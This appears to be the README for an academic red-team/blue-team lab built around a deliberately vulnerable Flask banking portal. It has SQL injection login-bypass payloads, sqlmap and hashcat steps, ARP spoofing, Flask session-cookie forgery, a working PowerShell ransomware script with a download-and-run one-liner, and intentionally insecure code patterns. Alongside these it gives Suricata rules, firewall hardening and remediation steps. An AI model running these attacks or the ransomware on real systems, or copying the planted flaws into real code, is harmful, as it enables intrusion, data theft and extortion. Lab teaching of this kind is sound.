# SecureBank — Vulnerable Web Banking Lab

Academic cybersecurity lab environment for the SecureBank Incident challenge (Red Team vs Blue Team).

## Overview

A deliberately vulnerable Flask banking portal with 7 fake corporate clients, designed for attack/defense exercises in an isolated VirtualBox host-only network.

## Vulnerabilities (Red Team Targets)

| Vulnerability | Location | Exploit |
|---|---|---|
| **SQL Injection** | `POST /login` — `WHERE username = '{username}'` | F-string concatenation, no parameterized queries |
| **Verbose Error Leak** | `POST /login` `except` block | Raw SQLite error message rendered in `{{ error }}` |
| **Weak Session Key** | `app.secret_key = "bank_secret"` | Hardcoded guessable Flask secret |
| **Unsalted SHA256 Passwords** | Passwords hashed with SHA256 (no salt) | Crackable with HashCat/John from rockyou.txt |

## Project Structure

```
F:\BankingApp\
├── app.py                    # Flask app (all routes + vulnerabilities)
├── setup_db.py               # DB initializer (7 users, 42 transactions)
├── requirements.txt          # Python deps
├── package.json              # Tailwind CLI
├── tailwind.config.js        # Custom theme config
├── database\db.sqlite        # SQLite database (generated)
├── static\
│   ├── css\tailwind.css      # Local compiled Tailwind (no CDN)
│   ├── fonts\                # Inter + Material Symbols (local)
│   └── images\               # Hero, founder, profile avatars
└── templates\
    ├── index.html            # Landing page
    ├── login.html            # Login form
    └── dashboard.html        # Customer dashboard
```

## Deploy on Ubuntu Server (Lab Instructions)

### 1. Transfer the project

```bash
# From your Windows host, push to GitHub first, then on Ubuntu:
sudo apt install git python3 python3-pip nodejs npm -y
git clone https://github.com/YOUR_USER/securebank-lab.git /var/www/bank
cd /var/www/bank
```

### 2. Install dependencies

```bash
pip3 install -r requirements.txt
npm install
```

### 3. Build Tailwind CSS (run once)

```bash
npx tailwindcss -i static/css/input.css -o static/css/tailwind.css --minify
```

### 4. Initialize database

```bash
python3 setup_db.py
```

### 5. Deploy with Apache2 + mod_wsgi

```bash
sudo apt install apache2 libapache2-mod-wsgi-py3 openssl -y
```

#### 5a. Enable required Apache modules

```bash
sudo a2enmod wsgi ssl rewrite headers
sudo systemctl restart apache2
```

#### 5b. Set permissions

```bash
sudo chown -R www-data:www-data /var/www/bank
sudo chmod -R 755 /var/www/bank
```

#### 5c. Create Apache virtual host (HTTP)

```apache
# /etc/apache2/sites-available/securebank.conf
<VirtualHost *:80>
    ServerName 192.168.100.10
    DocumentRoot /var/www/bank

    WSGIDaemonProcess bank python-path=/var/www/bank
    WSGIScriptAlias / /var/www/bank/wsgi.py

    <Directory /var/www/bank>
        Require all granted
    </Directory>

    Alias /static /var/www/bank/static
    <Directory /var/www/bank/static>
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/securebank_error.log
    CustomLog ${APACHE_LOG_DIR}/securebank_access.log combined
</VirtualHost>
```

```bash
sudo a2ensite securebank.conf
sudo systemctl reload apache2
```

#### 5d. Generate self-signed CA certificate for HTTPS (Lab 5)

```bash
# Create CA key and certificate
openssl genrsa -out /etc/ssl/private/securebank-ca-key.pem 2048
openssl req -x509 -new -nodes -key /etc/ssl/private/securebank-ca-key.pem \
  -sha256 -days 365 -out /etc/ssl/certs/securebank-ca.pem \
  -subj "/C=US/ST=State/L=City/O=SecureBank/CN=SecureBankCA"

# Create server key and CSR
openssl genrsa -out /etc/ssl/private/securebank-key.pem 2048
openssl req -new -key /etc/ssl/private/securebank-key.pem \
  -out /etc/ssl/certs/securebank.csr \
  -subj "/C=US/ST=State/L=City/O=SecureBank/CN=192.168.100.10"

# Sign server cert with CA
openssl x509 -req -in /etc/ssl/certs/securebank.csr \
  -CA /etc/ssl/certs/securebank-ca.pem \
  -CAkey /etc/ssl/private/securebank-ca-key.pem \
  -CAcreateserial -out /etc/ssl/certs/securebank-cert.pem \
  -days 365 -sha256
```

#### 5e. Create Apache virtual host (HTTPS)

```apache
# /etc/apache2/sites-available/securebank-ssl.conf
<VirtualHost *:443>
    ServerName 192.168.100.10
    DocumentRoot /var/www/bank

    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/securebank-cert.pem
    SSLCertificateKeyFile /etc/ssl/private/securebank-key.pem
    SSLCertificateChainFile /etc/ssl/certs/securebank-ca.pem

    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

    WSGIDaemonProcess bank-ssl python-path=/var/www/bank
    WSGIScriptAlias / /var/www/bank/wsgi.py

    <Directory /var/www/bank>
        Require all granted
    </Directory>

    Alias /static /var/www/bank/static
    <Directory /var/www/bank/static>
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/securebank_ssl_error.log
    CustomLog ${APACHE_LOG_DIR}/securebank_ssl_access.log combined
</VirtualHost>
```

```bash
sudo a2ensite securebank-ssl.conf
sudo systemctl reload apache2
```

Access at `http://192.168.100.10` or `https://192.168.100.10`

### 6. Install the CA certificate on Windows client (Lab 5)

On the Windows host, import `/etc/ssl/certs/securebank-ca.pem` into **Trusted Root Certification Authorities** so the browser trusts the self-signed HTTPS cert.

---

## Lab Walkthrough — Attack vs Defense

### Network Topology

| VM | IP Address | Role | Key Tools/Services |
|---|---|---|---|
| Kali Linux | `192.168.100.50` | Attacker | Nmap, Metasploit, Bettercap, HashCat, John, responder |
| Ubuntu Server | `192.168.100.10` | Target | Apache2 + mod_wsgi (Flask), OpenVPN, SMB, Suricata IDS |
| Windows Host | `192.168.100.100` | Victim PC | Firefox, Sysmon, PowerShell |

All VMs on isolated VirtualBox host-only network (`192.168.100.0/24`). No internet access.

---

### Phase 0 — Environment Setup

#### 0a. Ubuntu Server — Additional Services

```bash
# SMB share for internal file sharing
sudo apt install samba -y
sudo mkdir -p /srv/smb/share
echo -e "[securebank]\npath = /srv/smb/share\nbrowseable = yes\nread only = no\nguest ok = yes" | sudo tee -a /etc/samba/smb.conf
sudo systemctl restart smbd

# Create fake customer data file on SMB share
echo "Customer: Alice, Balance: 5500, SSN: 123-45-6789" | sudo tee /srv/smb/share/customer_emails.txt
echo "Customer: Bob, Balance: 12300, SSN: 234-56-7890" | sudo tee -a /srv/smb/share/customer_emails.txt
echo "Customer: Charlie, Balance: 8700, SSN: 345-67-8901" | sudo tee -a /srv/smb/share/customer_emails.txt
echo "Customer: Diana, Balance: 22150, SSN: 456-78-9012" | sudo tee -a /srv/smb/share/customer_emails.txt
echo "Customer: Edward, Balance: 3120, SSN: 567-89-0123" | sudo tee -a /srv/smb/share/customer_emails.txt

# OpenVPN (optional gateway)
sudo apt install openvpn -y
```

#### 0b. Windows Host — Test Data & Sysmon

```powershell
# Create lab files on desktop
New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\SecureBank_Data" -Force
Set-Content -Path "$env:USERPROFILE\Desktop\SecureBank_Data\customer_emails.txt" -Value @"
Customer: Alice, Balance: 5500, SSN: 123-45-6789
Customer: Bob, Balance: 12300, SSN: 234-56-7890
Customer: Charlie, Balance: 8700, SSN: 345-67-8901
Customer: Diana, Balance: 22150, SSN: 456-78-9012
Customer: Edward, Balance: 3120, SSN: 567-89-0123
"@

# Create a test ransomware target folder
New-Item -ItemType Directory -Path "C:\TestRansom" -Force
Set-Content -Path "C:\TestRansom\notes.txt" -Value "This is simulated sensitive business data."
Set-Content -Path "C:\TestRansom\budget.xlsx" -Value "Q4 Budget Forecast - Confidential"

# Install Sysmon (Lab 7)
# Download Sysmon from Microsoft Sysinternals, then:
# sysmon64.exe -accepteula -i sysmon-config.xml
```

#### 0c. Kali Linux — Verify Tools

```bash
sudo apt update
sudo apt install nmap metasploit-framework bettercap hashcat john responder -y
# Verify rockyou.txt exists
ls -la /usr/share/wordlists/rockyou.txt.gz
# If missing: sudo apt install wordlist -y
```

---

### Phase 1 — Red Team: Attack Walkthrough

Choose **two of three** goals to complete.

---

#### Goal 1 — Steal Customer Data (SQL Injection Path)

##### Step 1.1 — Reconnaissance

```bash
# Nmap scan of Ubuntu server
nmap -sV -sC -p- 192.168.100.10 -oN nmap_scan.txt
```

Expected open ports: `80 (HTTP)`, `443 (HTTPS)`, `139/445 (SMB)`, `1194 (OpenVPN)`, `22 (SSH)`.

##### Step 1.2 — Web App Recon

```bash
# Browse to the web app and test login
# Try SQLi manually first:
# Username: ' OR 1=1--
# Password: anything
```

**Expected result:** The app returns "Invalid credentials" (the query returns a row but hash doesn't match). The SQLi **is working** — the WHERE clause is bypassed.

##### Step 1.3 — Trigger Verbose Error to Confirm SQLi

```
Username: ' UNION SELECT 1,2,3,4,5,6--
Password: anything
```

**Expected result:** Error message displayed: `Database error: SELECTs to the left and right of UNION do not have the same number of result columns`. This confirms the injection point and reveals the table has 5 columns.

##### Step 1.4 — Extract Data via UNION

```bash
# First, find the hash of a known password to use in UNION injection
# SHA256('x') = 2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881
```

```bash
# Calculate hash on Kali:
echo -n "x" | sha256sum
```

```
# Login as injected user:
# Username: ' UNION SELECT 1,'inj','2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881','Injected',9999--
# Password: x
```

**Expected result:** Redirect to dashboard — you're logged in as the injected user. This proves full SQLi exploitation.

##### Step 1.5 — Dump Password Hashes

```bash
# Use sqlmap for automated extraction:
sqlmap -u "http://192.168.100.10/login" --data="username=admin&password=test" \
  --method POST --batch --dump
```

Or manually extract all hashes via UNION injections across multiple requests to enumerate the `users` table.

##### Step 1.6 — Crack Hashes with HashCat

```bash
# Save extracted hashes to file (format: username:hash)
echo "alice:4980b1f29fa32ff1..." > hashes.txt
echo "bob:ef92b778bafe771e..." >> hashes.txt
# ... all 7 users

# Crack with HashCat using rockyou.txt
hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

HashCat mode `1400` = SHA256.

##### Step 1.7 — Login as Any User

Once cracked, login as any user at `http://192.168.100.10/login` to access their dashboard and view their balance and transaction history. Steal at least 5 customer records for the report.

##### Step 1.8 — Alternative: Steal Database File Directly

If SMB misconfigured or you gain shell access:

```bash
# Via SMB (if guest access is enabled)
smbclient //192.168.100.10/securebank -N
get customer_emails.txt
exit

# Via reverse shell (if you achieve RCE)
# Copy the SQLite DB
cp /var/www/bank/database/db.sqlite /tmp/
```

---

#### Goal 2 — Ransomware Simulation on Windows Host

##### Step 2.1 — Initial Access (Phishing / Credential Theft)

```bash
# Use responder to capture NTLM hashes on the network
sudo responder -I eth0 -w -F
```

When the Windows victim visits a fake SMB share or authenticates, capture their NetNTLM hash.

##### Step 2.2 — Deliver the Ransomware Script

Create `ransomware.ps1` on Kali, host it, and get the victim to run it:

```powershell
# ransomware.ps1 — encrypts C:\TestRansom\ using AES
# (Academic lab use only — single non-critical folder)

$key = [byte[]]::new(32)
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)

$files = Get-ChildItem -Path "C:\TestRansom\" -File -Recurse
foreach ($file in $files) {
    $content = [IO.File]::ReadAllBytes($file.FullName)
    $encrypted = [Security.Cryptography.Aes]::Create().CreateEncryptor($key, [byte[]]::new(16)).TransformFinalBlock($content, 0, $content.Length)
    [IO.File]::WriteAllBytes("$($file.FullName).encrypted", $encrypted)
    Remove-Item $file.FullName -Force
}

# Drop ransom note
@"
--- SECUREBACK ---
Your files have been encrypted.
To restore, contact attacker@securebank.xyz
ID: SB-$(Get-Random -Maximum 99999)
"@ | Out-File -FilePath "C:\TestRansom\README_RANSOM.txt"
```

```bash
# On Kali, host the script:
python3 -m http.server 8080
```

Victim downloads and runs: `powershell -c "Invoke-WebRequest -Uri http://192.168.100.50:8080/ransomware.ps1 -OutFile %temp%\r.ps1; powershell %temp%\r.ps1"`

##### Step 2.3 — Simulate Recovery (for Blue Team demonstration)

```bash
# Decrypt script (demonstrate recovery):
# Use the same $key to reverse the encryption
```

---

#### Goal 3 — Impersonate an Authenticated User (Session Hijacking)

##### Step 3.1 — Session Sniffing with Bettercap

```bash
# ARP spoof to become MITM
sudo bettercap -eval "set arp.spoof.targets 192.168.100.100; arp.spoof on; net.sniff on"

# Or use ettercap for HTTP session capture:
sudo ettercap -T -M arp:remote /192.168.100.10// /192.168.100.100//
```

##### Step 3.2 — Decrypt the Flask Session Cookie

Flask signs sessions with `itsdangerous`. The secret key is `"bank_secret"` (hardcoded in `app.py`). Capture a victim's session cookie via MITM, then:

```bash
# Decode Flask session cookie
pip3 install flask-unsign
flask-unsign --decode --cookie "eyJiYWxhbmNlIjo1NTAw...<full cookie>"
```

Expected output shows the session payload: `{'balance': 5500.0, 'user_name': 'Alice Johnson'}`

##### Step 3.3 — Forge a Session Cookie

```bash
# Forge session as any user
flask-unsign --sign --cookie "{'balance': 99999.0, 'user_name': 'Admin'}" --secret "bank_secret"
```

Inject the forged cookie into your browser and access `/dashboard` to impersonate any user.

##### Step 3.4 — Alternative: Credential Theft via Phishing

```bash
# Clone the login page and capture creds
# OR use evilginx2 / setoolkit for credential harvesting
sudo setoolkit
# Select: Social Engineering Attacks > Website Attack Vectors > Credential Harvester
```

---

### Phase 2 — Blue Team: Defense Walkthrough

---

#### Defense 1 — Suricata IDS Configuration

##### Step 1.1 — Install Suricata

```bash
sudo apt install suricata -y
sudo systemctl stop suricata
```

##### Step 1.2 — Custom Rules for Detection

Create `/etc/suricata/rules/securebank.rules`:

```suricata
# Detect Nmap scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Nmap TCP Scan detected"; \
  flow:to_server; detection_filter:track by_src, count 50, seconds 10; \
  sid:1000001; rev:1;)

# Detect ARP spoofing (Bettercap)
alert arp $EXTERNAL_NET any -> $HOME_NET any (msg:"ARP spoofing detected"; \
  arp.opcode:2; \
  sid:1000002; rev:1;)

# Detect EternalBlue exploit (MS17-010)
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"EternalBlue exploit attempt"; \
  flow:to_server; content:"|00 00 00 31 ff|SMB|2e 00|"; \
  sid:1000003; rev:1;)

# Detect SMB login attempts
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"SMB login attempt"; \
  flow:to_server; content:"|00 00 00 00|"; depth:200; \
  sid:1000004; rev:1;)
```

##### Step 1.3 — Enable Rules

```bash
echo -e "\nrule-files:\n  - securebank.rules" | sudo tee -a /etc/suricata/suricata.yaml
sudo systemctl start suricata
```

##### Step 1.4 — Monitor Alerts

```bash
sudo tail -f /var/log/suricata/fast.log
# Or use: sudo jq . /var/log/suricata/eve.json | grep alert
```

---

#### Defense 2 — iptables Hardening

```bash
# Flush existing rules
sudo iptables -F
sudo iptables -X

# Default deny all inbound
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow SSH (from management only)
sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.100.0/24 -j ACCEPT

# Allow HTTPS (web portal)
sudo iptables -A INPUT -p tcp --dport 443 -s 192.168.100.0/24 -j ACCEPT

# Allow HTTP (redirect to HTTPS)
sudo iptables -A INPUT -p tcp --dport 80 -s 192.168.100.0/24 -j ACCEPT

# Allow OpenVPN
sudo iptables -A INPUT -p udp --dport 1194 -s 192.168.100.0/24 -j ACCEPT

# Deny SMB from Kali specifically
sudo iptables -A INPUT -p tcp --dport 445 -s 192.168.100.50 -j DROP
sudo iptables -A INPUT -p tcp --dport 139 -s 192.168.100.50 -j DROP

# Log dropped packets (for Suricata correlation)
sudo iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROP: "

# Make persistent
sudo apt install iptables-persistent -y
sudo netfilter-persistent save
```

---

#### Defense 3 — HSTS on Web Portal

Already configured in the Apache SSL vhost above:

```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

Verify with curl:

```bash
curl -I https://192.168.100.10 --insecure | grep -i strict
```

Expected: `Strict-Transport-Security: max-age=31536000; includeSubDomains`

---

#### Defense 4 — Sysmon on Windows Host (Lab 7)

```powershell
# Download Sysmon from Microsoft Sysinternals
# Download sysmon-config from https://github.com/SwiftOnSecurity/sysmon-config

# Install Sysmon
sysmon64.exe -accepteula -i sysmon-config.xml

# Verify installation
Get-Service Sysmon64

# View logs in Event Viewer:
# Applications and Services Logs > Microsoft > Windows > Sysmon > Operational

# Key Event IDs to monitor:
#   1 - Process creation
#   3 - Network connection
#   11 - FileCreate
#   15 - FileCreateStreamHash
```

For memory forensics with Volatility:

```powershell
# Capture memory dump
# Download LiveKD or use a dedicated memory capture tool
# dumpit.exe (from Comae) or winpmem
```

```bash
# On Kali, analyze with Volatility:
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 netscan
volatility -f memory.dump --profile=Win10x64 cmdline
```

---

#### Defense 5 — Automated Backups for Recovery

```bash
# Option A: ZFS snapshots (hourly)
sudo zfs snapshot rpool/ROOT@hourly-$(date +%Y%m%d-%H%M)

# Option B: rsync + chattr (simpler)
sudo apt install rsync -y
```

Create `/usr/local/bin/securebank-backup.sh`:

```bash
#!/bin/bash
BACKUP_DIR="/var/backups/securebank"
mkdir -p "$BACKUP_DIR"
rsync -av --delete /var/www/bank/ "$BACKUP_DIR/current/"
chattr -R +i "$BACKUP_DIR/current/"
echo "Backup completed: $(date)" >> /var/log/securebank-backup.log
```

```bash
sudo chmod +x /usr/local/bin/securebank-backup.sh

# Add to crontab for hourly backups
echo "0 * * * * root /usr/local/bin/securebank-backup.sh" | sudo tee /etc/cron.d/securebank-backup
```

**Restore procedure:**

```bash
chattr -R -i /var/backups/securebank/current/
rsync -av /var/backups/securebank/current/ /var/www/bank/
sudo systemctl reload apache2
```

---

### Phase 3 — Attack Timeline (Combined)

| Time | Red Team Action | Blue Team Detection / Response |
|---|---|---|
| T+0:00 | Nmap scan of Ubuntu (`nmap -sV 192.168.100.10`) | Suricata alert: Nmap TCP scan detected (`sid:1000001`) |
| T+0:05 | SQLi probe on /login (`' OR 1=1--`) | Apache access log shows suspicious username |
| T+0:10 | UNION injection to enumerate columns | Suricata HTTP alert; verbose error leaked table structure |
| T+0:15 | Extract password hashes via sqlmap | iptables log shows repeated POST requests from Kali |
| T+0:30 | HashCat cracking of SHA256 hashes | (Offline — no network detection) |
| T+1:00 | Login as cracked user (alice/rockyou) | Suricata alert: multiple SMB login attempts if SMB used |
| T+1:15 | ARP spoof with Bettercap for MITM | Suricata alert: ARP spoofing detected (`sid:1000002`) |
| T+1:20 | Capture and forge Flask session cookie | Sysmon Event 3 (network connection) on Windows |
| T+1:30 | Deliver ransomware script to Windows | Sysmon Event 1 (process: powershell), Event 11 (FileCreate) |
| T+1:35 | Ransomware encrypts C:\TestRansom\ | Sysmon Event 11 (.encrypted files); Windows user reports |
| T+1:40 | Blue Team initiates recovery from backup | Restore from ZFS snapshot or rsync backup |
| T+2:00 | Incident response / forensic analysis | Volatility memory dump analysis on Windows |

---

### Remediation Plan (5 Concrete Fixes)

| # | Fix | Lab Reference | Impact |
|---|---|---|---|
| 1 | **Use parameterized queries** — Replace f-string with `?` placeholders in SQL | Lab 3 (SQL) | Prevents all SQL injection |
| 2 | **Use strong random `secret_key`** — Generate with `os.urandom(24)` | Lab 6 (Web Security) | Prevents session forgery |
| 3 | **Enable certificate pinning** — Pin the CA cert in the browser/app | Lab 5 (PKI) | Prevents MITM SSL stripping |
| 4 | **Hash passwords with bcrypt** — Replace SHA256 with bcrypt + salt | Lab 4 (Cryptography) | Prevents hash cracking |
| 5 | **Implement proper error handling** — Log errors server-side, don't display raw exceptions | Lab 3 (Secure Coding) | Prevents information leakage |

---

## Seed Users

| Username | Password | Name | Balance |
|---|---|---|---|
| alice | rockyou | Alice Johnson | $5,500 |
| bob | password123 | Bob Smith | $12,300 |
| charlie | iloveyou | Charlie Brown | $8,700 |
| diana | letmein | Diana Prince | $22,150 |
| edward | 12345678 | Edward Norton | $3,120 |
| frank | admin123 | Frank Castle | $9,750 |
| grace | welcome | Grace Hopper | $6,400 |

All passwords are from rockyou.txt and hashed with SHA256 — crackable with HashCat/John.

## Blue Team Hardening Checklist

- [ ] Block Kali IP in iptables for SMB/SSH
- [ ] Configure Suricata rules for Nmap, ARP spoof, EternalBlue
- [ ] Enable HSTS on web portal
- [ ] Install Sysmon on Windows for process/file/network logging
- [ ] Take ZFS snapshots or rsync + chattr backups

## License

Academic use only — for authorized cybersecurity lab exercises.
